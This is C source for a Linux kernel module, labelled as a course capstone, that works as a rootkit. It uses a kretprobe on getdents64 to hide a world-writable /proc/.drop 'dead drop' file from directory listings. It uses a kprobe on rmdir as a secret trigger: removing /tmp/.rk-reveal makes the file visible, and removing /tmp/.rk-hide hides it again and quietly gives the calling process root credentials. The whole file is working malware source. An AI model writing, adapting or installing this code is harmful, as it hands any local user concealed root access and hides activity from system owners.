// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define HIDDEN_NAME ".drop"
#define REVEAL_PATH "/tmp/.rk-reveal"
#define HIDE_PATH   "/tmp/.rk-hide"

static struct proc_dir_entry *drop_entry;
static char drop_msg[256];
static bool visible;

/* --- proc read/write for the dead drop --- */

static int drop_show(struct seq_file *m, void *v)
{
	if (!visible)
		return -EACCES;
	seq_printf(m, "%s", drop_msg);
	return 0;
}

static int drop_open(struct inode *inode, struct file *file)
{
	if (!visible)
		return -EACCES;
	return single_open(file, drop_show, NULL);
}

static ssize_t drop_write(struct file *f, const char __user *buf,
			   size_t count, loff_t *pos)
{
	size_t len;

	if (!visible)
		return -EACCES;
	len = count < sizeof(drop_msg) - 1 ? count : sizeof(drop_msg) - 1;
	if (copy_from_user(drop_msg, buf, len))
		return -EFAULT;
	if (len > 0 && drop_msg[len - 1] == '\n')
		len--;
	drop_msg[len] = '\0';
	return count;
}

static const struct proc_ops drop_proc_ops = {
	.proc_open    = drop_open,
	.proc_read    = seq_read,
	.proc_lseek   = seq_lseek,
	.proc_release = single_release,
	.proc_write   = drop_write,
};

/* --- getdents64 kretprobe: hide .drop from /proc listings --- */

struct getdents_ctx {
	struct linux_dirent64 __user *dirent;
};

static int entry_getdents64(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	struct pt_regs *uregs = (struct pt_regs *)regs->di;

	ctx->dirent = (struct linux_dirent64 __user *)uregs->si;
	return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	long ret = regs_return_value(regs);
	struct linux_dirent64 *cur;
	char *buf;
	long off;

	if (ret <= 0)
		return 0;

	buf = kvmalloc(ret, GFP_KERNEL);
	if (!buf)
		return 0;

	if (copy_from_user(buf, ctx->dirent, ret)) {
		kvfree(buf);
		return 0;
	}

	off = 0;
	while (off < ret) {
		cur = (struct linux_dirent64 *)(buf + off);
		if (strcmp(cur->d_name, HIDDEN_NAME) == 0) {
			long rest = ret - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off,
					buf + off + cur->d_reclen, rest);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	if (copy_to_user(ctx->dirent, buf, ret))
		ret = -EFAULT;
	regs_set_return_value(regs, ret);
	kvfree(buf);
	return 0;
}

static struct kretprobe gd_krp = {
	.kp.symbol_name	= "__x64_sys_getdents64",
	.entry_handler	= entry_getdents64,
	.handler	= ret_getdents64,
	.data_size	= sizeof(struct getdents_ctx),
	.maxactive	= 20,
};

/* --- rmdir kprobe: reveal/hide triggers --- */

static int pre_rmdir(struct kprobe *p, struct pt_regs *regs)
{
	struct pt_regs *uregs = (struct pt_regs *)regs->di;
	const char __user *upath = (const char __user *)uregs->di;
	char kpath[128];
	long len;

	len = strncpy_from_user(kpath, upath, sizeof(kpath));
	if (len <= 0)
		return 0;

	if (strcmp(kpath, REVEAL_PATH) == 0) {
		visible = true;
	} else if (strcmp(kpath, HIDE_PATH) == 0) {
		struct cred *cred;

		visible = false;
		cred = prepare_creds();
		if (cred) {
			cred->uid  = GLOBAL_ROOT_UID;
			cred->gid  = GLOBAL_ROOT_GID;
			cred->euid = GLOBAL_ROOT_UID;
			cred->egid = GLOBAL_ROOT_GID;
			commit_creds(cred);
		}
	}

	return 0;
}

static struct kprobe rmdir_kp = {
	.symbol_name = "__x64_sys_rmdir",
	.pre_handler = pre_rmdir,
};

/* --- init/exit --- */

static int __init deaddrop_init(void)
{
	int err;

	drop_entry = proc_create(HIDDEN_NAME, 0666, NULL, &drop_proc_ops);
	if (!drop_entry)
		return -ENOMEM;

	err = register_kretprobe(&gd_krp);
	if (err) {
		proc_remove(drop_entry);
		return err;
	}

	err = register_kprobe(&rmdir_kp);
	if (err) {
		unregister_kretprobe(&gd_krp);
		proc_remove(drop_entry);
		return err;
	}

	visible = false;
	memset(drop_msg, 0, sizeof(drop_msg));
	pr_info("rk: dead drop installed at /proc/%s\n", HIDDEN_NAME);
	return 0;
}

static void __exit deaddrop_exit(void)
{
	unregister_kprobe(&rmdir_kp);
	unregister_kretprobe(&gd_krp);
	proc_remove(drop_entry);
}

module_init(deaddrop_init);
module_exit(deaddrop_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Capstone 3: hidden proc dead drop with rmdir control");
